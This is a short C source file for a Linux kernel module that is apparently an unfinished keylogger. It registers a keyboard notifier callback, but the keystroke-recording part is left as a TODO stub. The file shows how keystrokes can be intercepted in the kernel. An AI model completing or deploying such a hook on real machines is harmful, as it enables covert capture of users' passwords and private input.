#include "keylogger.h"

//    The used method does not manipulate any kernel datastructures or smth else, we just use the legitimate
//    kernel api.


//Callback function, thats called when the notification chain emits a new event to its 'subscribers'.
static int keyboard_event_callback(struct notifier_block *nb, unsigned long action, void *data)
{
    if (!(action == KBD_KEYCODE)) return NOTIFY_OK;

    struct keyboard_notifier_param *params = (struct keyboard_notifier_param*) data;


    if (params->value > KEYCODE_LOOKUP_TABLE_SIZE) return NOTIFY_OK;


    //TODO: complete


    return NOTIFY_OK; //event will be passed on in the notify loop
}


//we could also add a priority so that we will be added at the front of the list ~> prob no benefit
struct notifier_block np = {
    .notifier_call = keyboard_event_callback
};


void register_keylogger(void)
{
    pr_info("Registering keylogger\n");
    register_keyboard_notifier(&np);
}


void unregister_keylogger(void)
{
    pr_info("Unregistering keylogger\n");

    unregister_keyboard_notifier(&np);
}